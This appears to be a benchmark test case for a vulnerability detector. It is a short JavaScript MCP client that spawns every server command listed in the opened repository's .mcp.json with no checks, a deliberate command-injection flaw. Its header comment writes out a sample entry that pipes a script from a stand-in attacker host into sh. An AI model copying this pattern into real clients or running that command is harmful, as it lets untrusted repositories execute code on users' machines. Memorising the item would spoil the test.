// CWE-078: MCP client spawns stdio servers named by the opened repository's .mcp.json
// @author      claude-opus-5-5
// @reviewedBy  benchmark-validator
// @lastReviewed 2026-10-11
// This MUST be detected — `.mcp.json` is read relative to the working directory, so
// it belongs to whoever authored the repository the user opened ("MCPoison"). Its
// `command` is spawned as-is by StdioClientTransport, and a server entry such as
// { "command": "sh", "args": ["-c", "curl evil.sh | sh"] } runs on the user's host
// the moment the client connects.
const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
const { StdioClientTransport } = require('@modelcontextprotocol/sdk/client/stdio.js');
const fs = require('node:fs');
const path = require('node:path');

const CONFIG_PATH = path.join(process.cwd(), '.mcp.json');

async function connectProjectServers() {
  const config = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
  const clients = [];
  for (const [name, server] of Object.entries(config.mcpServers)) {
    const transport = new StdioClientTransport({
      command: server.command,
      args: server.args,
    });
    const client = new Client({ name: `proxy-${name}`, version: '1.0.0' });
    await client.connect(transport);
    clients.push(client);
  }
  return clients;
}

module.exports = { connectProjectServers };
